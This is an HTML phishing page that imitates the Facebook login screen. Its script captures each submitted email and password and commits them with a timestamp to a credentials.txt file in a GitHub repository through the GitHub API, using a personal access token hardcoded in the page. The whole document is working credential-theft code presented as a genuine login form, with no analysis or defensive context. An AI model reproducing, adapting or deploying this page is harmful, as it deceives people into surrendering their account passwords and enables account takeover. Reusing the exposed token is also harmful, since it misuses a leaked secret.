<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>facebook</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #f0f2f5;
    margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh;
    user-select: none;
  }
  .container {
    background: white;
    padding: 40px 50px;
    border-radius: 8px;
    box-shadow: 0 3px 15px rgb(0 0 0 / 0.2);
    width: 360px;
    text-align: center;
  }
  .logo {
    font-size: 48px;
    color: #1877f2;
    font-weight: bold;
    margin-bottom: 30px;
    user-select: none;
  }
  input[type="text"], input[type="password"] {
    width: 100%;
    padding: 14px 12px;
    margin-bottom: 12px;
    font-size: 16px;
    border-radius: 6px;
    border: 1px solid #dddfe2;
    outline: none;
    transition: border-color 0.3s;
  }
  input[type="text"]:focus, input[type="password"]:focus {
    border-color: #1877f2;
  }
  button {
    width: 100%;
    padding: 14px;
    background: #1877f2;
    border: none;
    color: white;
    font-size: 18px;
    font-weight: bold;
    border-radius: 6px;
    cursor: pointer;
    transition: background 0.3s ease;
  }
  button:hover {
    background: #165ec9;
  }
  #status {
    margin-top: 15px;
    font-size: 14px;
    color: green;
  }
</style>
</head>
<body>

<div class="container" role="main" aria-label="Facebook Login Form">
  <div class="logo">facebook</div>
  <form id="loginForm">
    <input type="text" name="email" placeholder="Email or phone number" required autocomplete="username" />
    <input type="password" name="password" placeholder="Password" required autocomplete="current-password" />
    <button type="submit">Log In</button>
  </form>
  <p id="status" aria-live="polite"></p>
</div>

<script>
// *** SET THESE VARIABLES ***
const TOKEN = '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'; // Your GitHub PAT (with repo access) - **keep secret!**
const OWNER = 'freeflixs';               // Your GitHub username/org
const REPO = 'freeflixs.github.io';                       // Your GitHub repo name
const PATH = 'credentials.txt';                      // File path in repo
const BRANCH = 'main';                               // Branch name

// Utility to get file SHA from GitHub (needed for update)
async function getFileSha() {
  const url = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${PATH}?ref=${BRANCH}`;
  const res = await fetch(url, { headers: { Authorization: 'token ' + TOKEN } });
  if (res.status === 404) return null; // file not found (new file)
  const data = await res.json();
  return data.sha;
}

// Utility to get current content of credentials.txt
async function getFileContent() {
  const url = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${PATH}?ref=${BRANCH}`;
  const res = await fetch(url, { headers: { Authorization: 'token ' + TOKEN } });
  if (res.status === 404) return '';
  const data = await res.json();
  return atob(data.content);
}

// Update credentials.txt with new content & commit
async function updateFile(content, sha) {
  const url = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${PATH}`;
  const body = {
    message: `Update credentials.txt at ${new Date().toISOString()}`,
    content: btoa(content),
    branch: BRANCH,
  };
  if (sha) body.sha = sha;
  
  const res = await fetch(url, {
    method: 'PUT',
    headers: {
      Authorization: 'token ' + TOKEN,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(body),
  });
  return res.json();
}

document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const email = e.target.email.value.trim();
  const password = e.target.password.value.trim();
  const status = document.getElementById('status');
  status.style.color = 'green';
  status.textContent = 'Saving credentials...';

  try {
    const oldContent = await getFileContent();
    const sha = await getFileSha();
    const newLine = `${new Date().toISOString()} | ${email} | ${password}\n`;
    const newContent = oldContent + newLine;
    const result = await updateFile(newContent, sha);

    if (result.content) {
      status.textContent = 'Credentials saved successfully!';
      e.target.reset();
    } else {
      status.style.color = 'red';
      status.textContent = 'Failed to save credentials.';
    }
  } catch (err) {
    console.error(err);
    status.style.color = 'red';
    status.textContent = 'Error saving credentials.';
  }
});
</script>

</body>
</html>
